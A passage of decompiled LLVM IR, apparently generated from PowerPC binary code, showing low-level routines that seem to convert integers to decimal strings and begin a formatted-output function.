  %v2_10009f78 = load i16, i16* %v1_10009f78, align 2
  %v3_10009f78 = zext i16 %v2_10009f78 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10009f80 = or i32 %v3_10009f78, 64
  store i32 %v1_10009f80, i32* %r0.global-to-local, align 4
  %v1_10009f84 = trunc i32 %v1_10009f80 to i16
  store i16 %v1_10009f84, i16* %v1_10009f78, align 2
  %v0_10009f88 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009f88 = urem i32 %v0_10009f88, 65536
  store i32 %v1_10009f88, i32* %r0.global-to-local, align 4
  %v1_10009f8c = and i32 %v0_10009f88, 2816
  store i32 %v1_10009f8c, i32* %r9.global-to-local, align 4
  %v3_10009f8c = icmp eq i32 %v1_10009f8c, 0
  br i1 %v3_10009f8c, label %dec_label_pc_10009f94, label %dec_label_pc_10009f9c

dec_label_pc_10009f94:                            ; preds = %dec_label_pc_10009f78
  %v0_10009f94 = load i32, i32* @r31, align 4
  %v1_10009f94 = add i32 %v0_10009f94, 12
  %v2_10009f94 = inttoptr i32 %v1_10009f94 to i32*
  %v3_10009f94 = load i32, i32* %v2_10009f94, align 4
  store i32 %v3_10009f94, i32* %r0.global-to-local, align 4
  %v2_10009f98 = add i32 %v0_10009f94, 28
  %v3_10009f98 = inttoptr i32 %v2_10009f98 to i32*
  store i32 %v3_10009f94, i32* %v3_10009f98, align 4
  br label %dec_label_pc_10009f9c

dec_label_pc_10009f9c:                            ; preds = %dec_label_pc_10009f78, %dec_label_pc_10009f00, %dec_label_pc_10009f94
  store i32 %v0_10009eb8, i32* %r0.global-to-local, align 4
  store i32 %v0_10009ec0, i32* @r31, align 4
  %v0_10009fac = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10009fac

; uselistorder directives
  uselistorder i32 %v0_10009f88, { 1, 0 }
  uselistorder i32 %v1_10009f64, { 1, 0 }
  uselistorder i32 %v0_10009f5c, { 1, 0 }
  uselistorder i32 %v0_10009f24, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_10009ecc, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 3, 2, 0, 5, 6, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 6, 7, 8, 5, 0, 1, 3, 4, 2 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009f9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009f78, { 1, 0 }
  uselistorder label %dec_label_pc_10009f5c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10009ef4, { 1, 0 }
  uselistorder label %dec_label_pc_10009ee8, { 1, 0 }
}

define i32 @function_10009fb0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10009fb0:
  %v0_10009fb0 = load i32, i32* @r5, align 4
  %v1_10009fb0 = icmp slt i32 %v0_10009fb0, 0
  %v1_10009fb4 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10009ff0 = icmp eq i32 %v1_10009fb4, 0
  br i1 %v1_10009fb0, label %dec_label_pc_10009ff0, label %dec_label_pc_10009fbc

dec_label_pc_10009fbc:                            ; preds = %dec_label_pc_10009fb0
  br i1 %v3_10009ff0, label %dec_label_pc_10009fc4, label %dec_label_pc_10009ff8

dec_label_pc_10009fc4:                            ; preds = %dec_label_pc_10009fbc
  %v3_10009fc4 = icmp eq i32 %arg1, 256
  br i1 %v3_10009fc4, label %dec_label_pc_10009fd0, label %dec_label_pc_10009fd8

dec_label_pc_10009fd0:                            ; preds = %dec_label_pc_10009fc4
  br label %dec_label_pc_10009fe4

dec_label_pc_10009fd8:                            ; preds = %dec_label_pc_10009fc4
  %v3_10009fd8 = icmp eq i32 %arg1, 512
  br i1 %v3_10009fd8, label %dec_label_pc_10009fe0, label %dec_label_pc_10009fe4

dec_label_pc_10009fe0:                            ; preds = %dec_label_pc_10009fd8
  br label %dec_label_pc_10009fe4

dec_label_pc_10009fe4:                            ; preds = %dec_label_pc_10009fd8, %dec_label_pc_10009fd0, %dec_label_pc_10009fe0
  ret i32 0

dec_label_pc_10009ff0:                            ; preds = %dec_label_pc_10009fb0
  br i1 %v3_10009ff0, label %dec_label_pc_1000a004, label %dec_label_pc_10009ff8

dec_label_pc_10009ff8:                            ; preds = %dec_label_pc_10009fbc, %dec_label_pc_10009ff0
  %v2_10009ff8 = load i32, i32* %arg2, align 4
  ret i32 %v2_10009ff8

dec_label_pc_1000a004:                            ; preds = %dec_label_pc_10009ff0
  %v3_1000a004 = icmp eq i32 %arg1, 256
  %v2_1000a008 = load i32, i32* %arg2, align 4
  br i1 %v3_1000a004, label %dec_label_pc_1000a010, label %dec_label_pc_1000a018

dec_label_pc_1000a010:                            ; preds = %dec_label_pc_1000a004
  %v1_1000a010 = urem i32 %v2_1000a008, 256
  br label %dec_label_pc_1000a024

dec_label_pc_1000a018:                            ; preds = %dec_label_pc_1000a004
  %v3_1000a018 = icmp eq i32 %arg1, 512
  br i1 %v3_1000a018, label %dec_label_pc_1000a020, label %dec_label_pc_1000a024

dec_label_pc_1000a020:                            ; preds = %dec_label_pc_1000a018
  %v1_1000a020 = mul i32 %v2_1000a008, 65536
  %v2_1000a020 = sdiv i32 %v1_1000a020, 65536
  br label %dec_label_pc_1000a024

dec_label_pc_1000a024:                            ; preds = %dec_label_pc_1000a018, %dec_label_pc_1000a010, %dec_label_pc_1000a020
  %v0_1000a024 = phi i32 [ %v2_1000a008, %dec_label_pc_1000a018 ], [ %v1_1000a010, %dec_label_pc_1000a010 ], [ %v2_1000a020, %dec_label_pc_1000a020 ]
  %tmp = icmp slt i32 %v0_1000a024, 0
  %v1_1000a028 = zext i1 %tmp to i32
  %v2_1000a028 = ashr i32 %v0_1000a024, 31
  %v3_1000a028 = and i32 %v2_1000a028, -2
  %v4_1000a028 = or i32 %v3_1000a028, %v1_1000a028
  ret i32 %v4_1000a028

; uselistorder directives
  uselistorder i32 %v0_1000a024, { 1, 0 }
  uselistorder i32 %v2_1000a008, { 2, 0, 1 }
  uselistorder i1 %v3_10009ff0, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000a024, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009ff8, { 1, 0 }
  uselistorder label %dec_label_pc_10009fe4, { 2, 0, 1 }
}

define i32 @function_1000a030(i16* %arg1) local_unnamed_addr {
dec_label_pc_1000a030:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000a030 = load i32, i32* @r4, align 4
  %v3_1000a030 = icmp eq i32 %v0_1000a030, 256
  br i1 %v3_1000a030, label %dec_label_pc_1000a03c, label %dec_label_pc_1000a044

dec_label_pc_1000a03c:                            ; preds = %dec_label_pc_1000a030
  %v0_1000a03c = load i32, i32* @r6, align 4
  %v1_1000a03c = trunc i32 %v0_1000a03c to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_1000a03c, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_1000a044:                            ; preds = %dec_label_pc_1000a030
  %v3_1000a034 = icmp eq i32 %v0_1000a030, 2048
  br i1 %v3_1000a034, label %dec_label_pc_1000a04c, label %dec_label_pc_1000a058

dec_label_pc_1000a04c:                            ; preds = %dec_label_pc_1000a044
  %v0_1000a04c = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000a04c, i32* %tmp2, align 4
  %v0_1000a050 = load i32, i32* @r6, align 4
  %v3_1000a050 = add i32 %tmp, 4
  %v4_1000a050 = inttoptr i32 %v3_1000a050 to i32*
  store i32 %v0_1000a050, i32* %v4_1000a050, align 4
  ret i32 %tmp

dec_label_pc_1000a058:                            ; preds = %dec_label_pc_1000a044
  %v3_1000a044 = icmp eq i32 %v0_1000a030, 512
  %v0_1000a05c = load i32, i32* @r6, align 4
  br i1 %v3_1000a044, label %dec_label_pc_1000a05c, label %dec_label_pc_1000a064

dec_label_pc_1000a05c:                            ; preds = %dec_label_pc_1000a058
  %v1_1000a05c = trunc i32 %v0_1000a05c to i16
  store i16 %v1_1000a05c, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_1000a064:                            ; preds = %dec_label_pc_1000a058
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000a05c, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 0, 1, 2, 4 }
}

define i32 @function_1000a06c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000a06c:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000a06c = load i32, i32* %r7.global-to-local, align 4
  %v3_1000a06c = icmp eq i32 %v0_1000a06c, 0
  store i1 %v3_1000a06c, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* %r30.global-to-local, align 4
  %tmp12 = icmp sgt i32 %v0_1000a06c, -1
  br i1 %tmp12, label %dec_label_pc_1000a0a0, label %dec_label_pc_1000a080

dec_label_pc_1000a080:                            ; preds = %dec_label_pc_1000a06c
  %v0_1000a080 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a084 = sub i32 0, %v0_1000a06c
  store i32 %v1_1000a084, i32* %r7.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_1000a080, -1
  br i1 %tmp13, label %dec_label_pc_1000a0a0, label %dec_label_pc_1000a08c

dec_label_pc_1000a08c:                            ; preds = %dec_label_pc_1000a080
  %v0_1000a08c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000a08c = sub i32 0, %v0_1000a08c
  %v2_1000a08c = sub i32 -1, %v0_1000a08c
  store i32 %v1_1000a08c, i32* %r6.global-to-local, align 4
  %v4_1000a08c = icmp uge i32 %v2_1000a08c, %v1_1000a08c
  %v1_1000a090 = sub i32 -1, %v0_1000a080
  %v3_1000a090 = zext i1 %v4_1000a08c to i32
  %v4_1000a090 = add i32 %v3_1000a090, %v1_1000a090
  store i32 %v4_1000a090, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a0a0

dec_label_pc_1000a0a0:                            ; preds = %dec_label_pc_1000a06c, %dec_label_pc_1000a080, %dec_label_pc_1000a08c
  %v1_1000a0a4 = phi i32 [ %v1_1000a084, %dec_label_pc_1000a08c ], [ %v1_1000a084, %dec_label_pc_1000a080 ], [ %v0_1000a06c, %dec_label_pc_1000a06c ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1000a08c ], [ 0, %dec_label_pc_1000a080 ], [ 0, %dec_label_pc_1000a06c ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_1000a0a4 = udiv i32 -1, %v1_1000a0a4
  store i32 %v2_1000a0a4, i32* %r8.global-to-local, align 4
  %v2_1000a0ac = load i32, i32* %r3.global-to-local, align 4
  %v3_1000a0ac = inttoptr i32 %v2_1000a0ac to i8*
  store i8 0, i8* %v3_1000a0ac, align 1
  %v0_1000a0b0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a0b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000a0b0 = mul i32 %v1_1000a0b0, %v0_1000a0b0
  %v1_1000a0b4 = sub i32 0, %v2_1000a0b0
  store i32 %v1_1000a0b4, i32* %r31.global-to-local, align 4
  %v4_1000a0b8 = icmp eq i32 %v1_1000a0b0, %v1_1000a0b4
  br i1 %v4_1000a0b8, label %dec_label_pc_1000a0c0, label %dec_label_pc_1000a0c8

dec_label_pc_1000a0c0:                            ; preds = %dec_label_pc_1000a0a0
  %v1_1000a0c0 = add i32 %v0_1000a0b0, 1
  store i32 %v1_1000a0c0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a0c8

dec_label_pc_1000a0c8:                            ; preds = %dec_label_pc_1000a0a0, %dec_label_pc_1000a0c0
  %v0_1000a0c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a0c8, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_1000a0cc

dec_label_pc_1000a0ccthread-pre-split:            ; preds = %dec_label_pc_1000a120
  %v0_1000a0cc.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_1000a0d0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000a0cc

dec_label_pc_1000a0cc:                            ; preds = %dec_label_pc_1000a0ccthread-pre-split, %dec_label_pc_1000a0c8
  %v1_1000a114 = phi i32 [ %v1_1000a0d0.pre, %dec_label_pc_1000a0ccthread-pre-split ], [ %v1_1000a0b0, %dec_label_pc_1000a0c8 ]
  %v1_1000a0e4 = phi i32 [ %v0_1000a0cc.pr, %dec_label_pc_1000a0ccthread-pre-split ], [ %v0_1000a0c8, %dec_label_pc_1000a0c8 ]
  %v3_1000a0cc = icmp eq i32 %v1_1000a0e4, 0
  %v0_1000a0d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a0d0 = udiv i32 %v0_1000a0d0, %v1_1000a114
  br i1 %v3_1000a0cc, label %dec_label_pc_1000a114, label %dec_label_pc_1000a0d8

dec_label_pc_1000a0d8:                            ; preds = %dec_label_pc_1000a0cc
  %v2_1000a0d8 = udiv i32 %v1_1000a0e4, %v1_1000a114
  %v2_1000a0dc = mul i32 %v2_1000a0d8, %v1_1000a114
  %v2_1000a0e0 = mul i32 %v2_1000a0d0, %v1_1000a114
  %v2_1000a0e4 = sub i32 %v1_1000a0e4, %v2_1000a0dc
  store i32 %v2_1000a0d8, i32* %r12.global-to-local, align 4
  %v0_1000a0ec = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a0ec = mul i32 %v0_1000a0ec, %v2_1000a0e4
  %v2_1000a0f0 = sub i32 %v0_1000a0d0, %v2_1000a0e0
  %v2_1000a0f4 = add i32 %v2_1000a0ec, %v2_1000a0f0
  %v0_1000a0f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a0f8 = mul i32 %v0_1000a0f8, %v2_1000a0e4
  %v2_1000a0fc = udiv i32 %v2_1000a0f4, %v1_1000a114
  %v2_1000a100 = add i32 %v2_1000a0f8, %v2_1000a0d0
  %v2_1000a104 = mul i32 %v2_1000a0fc, %v1_1000a114
  %v2_1000a108 = add i32 %v2_1000a100, %v2_1000a0fc
  store i32 %v2_1000a108, i32* %r6.global-to-local, align 4
  %v2_1000a10c = sub i32 %v2_1000a0f4, %v2_1000a104
  store i32 %v2_1000a10c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a120

dec_label_pc_1000a114:                            ; preds = %dec_label_pc_1000a0cc
  %v2_1000a114 = mul i32 %v2_1000a0d0, %v1_1000a114
  %v2_1000a118 = sub i32 %v0_1000a0d0, %v2_1000a114
  store i32 %v2_1000a118, i32* %r5.global-to-local, align 4
  store i32 %v2_1000a0d0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000a120

dec_label_pc_1000a120:                            ; preds = %dec_label_pc_1000a0d8, %dec_label_pc_1000a114
  %v1_1000a124 = phi i32 [ %v2_1000a0d8, %dec_label_pc_1000a0d8 ], [ 0, %dec_label_pc_1000a114 ]
  %v0_1000a124 = phi i32 [ %v2_1000a108, %dec_label_pc_1000a0d8 ], [ %v2_1000a0d0, %dec_label_pc_1000a114 ]
  %v0_1000a128 = phi i32 [ %v2_1000a10c, %dec_label_pc_1000a0d8 ], [ %v2_1000a118, %dec_label_pc_1000a114 ]
  %v2_1000a124 = or i32 %v0_1000a124, %v1_1000a124
  %v5_1000a124 = icmp eq i32 %v2_1000a124, 0
  store i1 %v5_1000a124, i1* %cr0_eq.global-to-local, align 1
  %v1_1000a12c = load i32, i32* %r30.global-to-local, align 4
  %v0_1000a130 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a130 = add i32 %v0_1000a130, -1
  store i32 %v1_1000a130, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_1000a128, 10
  %v1_1000a128.v2_1000a12c.v = select i1 %tmp14, i32 48, i32 %v1_1000a12c
  %v1_1000a128.v2_1000a12c = add i32 %v0_1000a128, %v1_1000a128.v2_1000a12c.v
  %extract.t9.extract.t = trunc i32 %v1_1000a128.v2_1000a12c to i8
  %v3_1000a140 = inttoptr i32 %v1_1000a130 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_1000a140, align 1
  %v0_1000a144 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000a144, label %dec_label_pc_1000a148, label %dec_label_pc_1000a0ccthread-pre-split

dec_label_pc_1000a148:                            ; preds = %dec_label_pc_1000a120
  %v0_1000a148 = load i32, i32* @r29, align 4
  %v3_1000a148 = icmp eq i32 %v0_1000a148, 0
  br i1 %v3_1000a148, label %dec_label_pc_1000a148.dec_label_pc_1000a158_crit_edge, label %dec_label_pc_1000a150

dec_label_pc_1000a148.dec_label_pc_1000a158_crit_edge: ; preds = %dec_label_pc_1000a148
  %v0_1000a160.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a158

dec_label_pc_1000a150:                            ; preds = %dec_label_pc_1000a148
  %v2_1000a154 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000a154 = add i32 %v2_1000a154, -1
  %v4_1000a154 = inttoptr i32 %v3_1000a154 to i8*
  store i8 45, i8* %v4_1000a154, align 1
  store i32 %v3_1000a154, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a158

dec_label_pc_1000a158:                            ; preds = %dec_label_pc_1000a148.dec_label_pc_1000a158_crit_edge, %dec_label_pc_1000a150
  %v0_1000a160 = phi i32 [ %v0_1000a160.pre, %dec_label_pc_1000a148.dec_label_pc_1000a158_crit_edge ], [ %v3_1000a154, %dec_label_pc_1000a150 ]
  ret i32 %v0_1000a160

; uselistorder directives
  uselistorder i32 %v2_1000a0d8, { 1, 2, 0 }
  uselistorder i32 %v2_1000a0d0, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_1000a114, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_1000a0b0, { 1, 2, 0 }
  uselistorder i32 %v0_1000a0b0, { 1, 0 }
  uselistorder i32 %v0_1000a06c, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i1* %cr0_eq.global-to-local, { 1, 2, 0 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a158, { 1, 0 }
  uselistorder label %dec_label_pc_1000a120, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0a0, { 2, 1, 0 }
}

define i32 @function_1000a164(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000a164:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_1000a164 = load i32, i32* @lr, align 4
  store i32 %v0_1000a164, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_1000a180 = add i32 %tmp, 11
  %v2_1000a180 = inttoptr i32 %v1_1000a180 to i8*
  %v3_1000a180 = load i8, i8* %v2_1000a180, align 1
  %v4_1000a180 = zext i8 %v3_1000a180 to i32
  store i32 %v4_1000a180, i32* %r31.global-to-local, align 4
  %v1_1000a184 = or i32 %v4_1000a180, 32
  %v1_1000a188 = icmp ult i32 %v1_1000a184, 97
  %v3_1000a188 = icmp eq i32 %v1_1000a184, 97
  store i1 %v1_1000a188, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a188, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_1000a194 = add i32 %tmp, 4
  %v2_1000a194 = inttoptr i32 %v1_1000a194 to i32*
  %v3_1000a194 = load i32, i32* %v2_1000a194, align 4
  store i32 %v3_1000a194, i32* %r28.global-to-local, align 4
  %v2_1000a198 = load i32, i32* %arg2, align 4
  store i32 %v2_1000a198, i32* %r30.global-to-local, align 4
  br i1 %v3_1000a188, label %dec_label_pc_1000a1a0, label %dec_label_pc_1000a1a8

dec_label_pc_1000a1a0:                            ; preds = %dec_label_pc_1000a164
  %v1_1000a1a0 = add nuw nsw i32 %v4_1000a180, 6
  store i32 %v1_1000a1a0, i32* %r0.global-to-local, align 4
  %v1_1000a1a4 = urem i32 %v1_1000a1a0, 256
  store i32 %v1_1000a1a4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a1a8

dec_label_pc_1000a1a8:                            ; preds = %dec_label_pc_1000a164, %dec_label_pc_1000a1a0
  %v0_1000a25c = phi i32 [ %v4_1000a180, %dec_label_pc_1000a164 ], [ %v1_1000a1a4, %dec_label_pc_1000a1a0 ]
  %v1_1000a1a8 = icmp slt i32 %v2_1000a198, 0
  %v3_1000a1a8 = icmp eq i32 %v2_1000a198, 0
  store i1 %v1_1000a1a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a1a8, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1000a198, -1
  br i1 %tmp75, label %dec_label_pc_1000a1b4, label %dec_label_pc_1000a1b0

dec_label_pc_1000a1b0:                            ; preds = %dec_label_pc_1000a1a8
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a1b4

dec_label_pc_1000a1b4:                            ; preds = %dec_label_pc_1000a1a8, %dec_label_pc_1000a1b0
  %v0_1000a36c44 = phi i32 [ %v2_1000a198, %dec_label_pc_1000a1a8 ], [ 6, %dec_label_pc_1000a1b0 ]
  %v1_1000a1b4 = add i32 %tmp, 12
  %v2_1000a1b4 = inttoptr i32 %v1_1000a1b4 to i32*
  %v3_1000a1b4 = load i32, i32* %v2_1000a1b4, align 4
  store i32 %v3_1000a1b4, i32* %r9.global-to-local, align 4
  %v1_1000a1b8 = and i32 %v3_1000a1b4, 2
  %v3_1000a1b8 = icmp eq i32 %v1_1000a1b8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_1000a1b8, label %dec_label_pc_1000a1d0, label %dec_label_pc_1000a1dc

dec_label_pc_1000a1d0:                            ; preds = %dec_label_pc_1000a1b4
  %v1_1000a1d0 = urem i32 %v3_1000a1b4, 2
  store i32 %v1_1000a1d0, i32* %r7.global-to-local, align 4
  %v3_1000a1d0 = icmp eq i32 %v1_1000a1d0, 0
  br i1 %v3_1000a1d0, label %dec_label_pc_1000a1e0, label %dec_label_pc_1000a1dc

dec_label_pc_1000a1dc:                            ; preds = %dec_label_pc_1000a1d0, %dec_label_pc_1000a1b4
  %storemerge = phi i32 [ 43, %dec_label_pc_1000a1b4 ], [ 32, %dec_label_pc_1000a1d0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_1000a1dc = trunc i32 %storemerge to i8
  store i8 %v6_1000a1dc, i8* %stack_var_-200, align 1
  br label %dec_label_pc_1000a1e0

dec_label_pc_1000a1e0:                            ; preds = %dec_label_pc_1000a1d0, %dec_label_pc_1000a1dc
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000a1a8, label %dec_label_pc_1000a344, label %dec_label_pc_1000a25c

dec_label_pc_1000a25c:                            ; preds = %dec_label_pc_1000a1e0
  %v1_1000a25c = icmp ult i32 %v0_1000a25c, 96
  %v2_1000a25c = icmp ugt i32 %v0_1000a25c, 96
  %v3_1000a25c = icmp eq i32 %v0_1000a25c, 96
  store i1 %v1_1000a25c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a25c, i1* %cr7_eq.global-to-local, align 1
  %v2_1000a264 = add i32 %tmp, 16
  %v3_1000a264 = inttoptr i32 %v2_1000a264 to i32*
  store i32 32, i32* %v3_1000a264, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_1000a25c, label %dec_label_pc_1000a288, label %dec_label_pc_1000a27c

dec_label_pc_1000a27c:                            ; preds = %dec_label_pc_1000a25c
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a288

dec_label_pc_1000a288:                            ; preds = %dec_label_pc_1000a25c, %dec_label_pc_1000a27c
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f838.301 to i32), i32 8), %dec_label_pc_1000a25c ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1000f838.301 to i32), i32 12), %dec_label_pc_1000a27c ]
  store i32 ptrtoint ([4 x i8]* @global_var_1000f838.301 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a294 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000a294, i32* %r8.global-to-local, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a734

dec_label_pc_1000a344:                            ; preds = %dec_label_pc_1000a1e0
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1000a348 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000a348, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_1000a394 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_1000a368

dec_label_pc_1000a368:                            ; preds = %dec_label_pc_1000a3e8.dec_label_pc_1000a368_crit_edge, %dec_label_pc_1000a344
  %v0_1000a36c = phi i32 [ %v0_1000a36c.pre, %dec_label_pc_1000a3e8.dec_label_pc_1000a368_crit_edge ], [ %v0_1000a36c44, %dec_label_pc_1000a344 ]
  %v3_1000a36c = call %1 @__asm_cror(i32 %v0_1000a36c, i32 %tmp, i32 %v0_1000a36c)
  %v11_1000a36c = extractvalue %1 %v3_1000a36c, 7
  store i4 %v11_1000a36c, i4* @cr4, align 1
  %v0_1000a370 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a370, label %dec_label_pc_1000a384, label %dec_label_pc_1000a398

dec_label_pc_1000a384:                            ; preds = %dec_label_pc_1000a368
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a398

dec_label_pc_1000a398:                            ; preds = %dec_label_pc_1000a368, %dec_label_pc_1000a384
  %storemerge2 = phi i32 [ %v1_1000a394, %dec_label_pc_1000a384 ], [ %tmp55, %dec_label_pc_1000a368 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1000a3a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000a3a8 = add i32 %v0_1000a3a8, 9
  store i32 %v1_1000a3a8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a3c4

